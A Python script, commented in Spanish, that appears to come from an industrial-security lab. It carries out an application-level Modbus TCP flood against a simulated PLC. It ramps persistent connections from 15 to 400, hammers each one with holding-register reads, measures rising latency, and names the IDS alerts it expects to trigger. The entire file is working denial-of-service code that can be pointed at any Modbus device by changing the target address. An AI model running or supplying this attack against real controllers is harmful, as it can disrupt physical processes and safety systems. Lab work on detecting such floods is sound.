#!/usr/bin/env python3
"""
Ataque 4, tecnica 2: DoS a nivel de APLICACION contra el PLC.
 
 
Este ataque toma el camino contrario a proposito: en vez de MUCHAS
conexiones nuevas sin completar (para maximizar volumen de paquetes),
abre POCAS conexiones Modbus REALES y persistentes (se completan de
verdad y se mantienen abiertas) y bombardea cada una con peticiones de
lectura legitimas (read_holding_registers) al ritmo maximo posible. Esto
SI llega al codigo Python del servidor pymodbus en cada peticion, asi
que compite de verdad por el GIL con los hilos de proceso fisico/BPCS/SIS
(ver modbus_server.py) -- el vector correcto para intentar demostrar
degradacion o denegacion real, no solo trafico anomalo detectable.
 
Medicion de impacto: ademas de vigilar "docker logs -f plc_simulator"
(igual que en la tecnica 1), este script mide por si mismo la latencia
de cada peticion y compara el primer tercio del ataque contra el ultimo
tercio -- si el PLC empieza a tardar mas en responder a medida que el
ataque avanza, es evidencia cuantitativa de RETARDO real, no solo de
denegacion total.
"""
 
import threading
import time
import statistics
from datetime import datetime
 
from pymodbus.client import ModbusTcpClient
 
TARGET_HOST = "192.168.200.3"
TARGET_PORT = 5020
SLAVE_ID = 1
 
CONNECTION_STEPS = [15, 50, 100, 200, 400]
STEP_DURATION_S = 20    # duracion entre escalones
PAUSE_BETWEEN_STEPS_S = 12
 
_lock = threading.Lock()
_samples = []            # lista de (t_offset_s, latencia_ms), compartida entre workers
_requests_total = [0]
_errors_total = [0]
 
 
def log_message(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}", flush=True)
 
 
def worker(samples, requests_total, errors_total, start_time, stop_time):
    client = ModbusTcpClient(TARGET_HOST, port=TARGET_PORT, timeout=3)
    if not client.connect():
        with _lock:
            errors_total[0] +=1
        return
 
    local_requests = 0
    local_errors = 0
 
    while time.time() < stop_time:
        t0 = time.perf_counter()
        result = client.read_holding_registers(0, count=17, slave=SLAVE_ID)
        elapsed_ms = (time.perf_counter() - t0) * 1000.0
        local_requests += 1
 
        if result.isError():
            local_errors += 1
        else:
            with _lock:
                samples.append(elapsed_ms)
 
    client.close()
    with _lock:
        requests_total[0] += local_requests
        errors_total[0] += local_errors

def run_step(n_connections, duration_s):
    log_message(
        f"---- Escalon: {n_connections} conexiones concurrentes, {duration_s}s ----"
    )
 
    samples = []
    requests_total = [0]
    errors_total = [0]
 
    start_time = time.time()
    stop_time = start_time + duration_s
 
    threads = [
        threading.Thread(
            target=worker,
            args=(samples, requests_total, errors_total, start_time, stop_time),
        )
        for _ in range(n_connections)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
 
    total = requests_total[0]
    errors = errors_total[0]
    rate = total / duration_s if duration_s else 0
    mean_latency = statistics.mean(samples) if samples else float("nan")
    median_latency = statistics.median(samples) if samples else float("nan")
    max_latency = max(samples) if samples else float("nan")
 
    log_message(
        f"Resultado escalon {n_connections} conexiones -> "
        f"peticiones: {total} (~{rate:.0f} peticiones/s), errores: {errors}, "
        f"latencia media: {mean_latency:.1f} ms, mediana: {median_latency:.1f} ms, "
        f"maxima: {max_latency:.1f} ms"
    )
 
    return {
        "connections": n_connections,
        "requests": total,
        "rate": rate,
        "errors": errors,
        "mean_latency_ms": mean_latency,
        "median_latency_ms": median_latency,
        "max_latency_ms": max_latency,
    }
 
 
 
def main():
    log_message(
        f"########## INICIO ataque 4 (tecnica 2): flood de aplicacion Modbus "
        f"contra {TARGET_HOST}:{TARGET_PORT} -- {CONNECTION_STEPS} escalones "
        f"persistentes, {STEP_DURATION_S}s ##########"
    )
    log_message(
        "Mientras corre, revisa en otra terminal 'docker logs -f plc_simulator' "
        "para ver si la cadencia de telemetria (cada ~10s) se retrasa o se "
        "interrumpe. Al terminar, comprueba tambien notice.log: se espera "
        "ModbusRequestFlood, y NO (o solo marginalmente) DoSAttack -- son "
        "señales complementarias, no la misma cosa."
    )
    results = []
    for i,n in enumerate(CONNECTION_STEPS):
        results.append(run_step(n,STEP_DURATION_S))
        if i < len(CONNECTION_STEPS) - 1:
            log_message(f"Pausa de {PAUSE_BETWEEN_STEPS_S} antes del siguiente escalon...")
            time.sleep(PAUSE_BETWEEN_STEPS_S)
    log_message("========== RESUMEN DE LA RAMPA ==========")
    log_message(
        f"{'Conexiones':>10} | {'Peticiones/s':>13} | {'Latencia media (ms)':>20} | {'Latencia max (ms)':>18} | {'Errores':>7}"
    )
    for r in results:
        log_message(
            f"{r['connections']:>10} | {r['rate']:>13.0f} | {r['mean_latency_ms']:>20.1f} | {r['max_latency_ms']:>18.1f} | {r['errors']:>7}"
        )
    valid = [r for r in results if r["requests"] > 0]
    if len(valid) >= 2:
        first, last = valid[0], valid [-1]
        if last["mean_latency_ms"] > first["mean_latency_ms"] * 1.3:
            growth = (last["mean_latency_ms"] / first["mean_latency_ms"] - 1) * 100
            log_message(
                f"La latencia media crecio un {growth:.0f}% entre el escalon de "
                f"{first['connections']} y el de {last['connections']} conexiones "
                f"-- indicio de degradacion/saturacion real a mayor escala.",
                "SUCCESS",
            )
        else:
            log_message(
                "La latencia media no crecio de forma apreciable ni siquiera en el "
                "escalon mas grande -- revisa tambien el %CPU real observado en "
                "'docker stats' durante la rampa: puede que el cuello de botella "
                "este en el propio atacante (throughput de red/CPU del contenedor "
                "attacker_node) y no en el PLC.",
                "WARNING",
            )

    log_message("########## FIN ataque 4 (tecnica 2) ##########")
 
 
if __name__ == "__main__":
    main()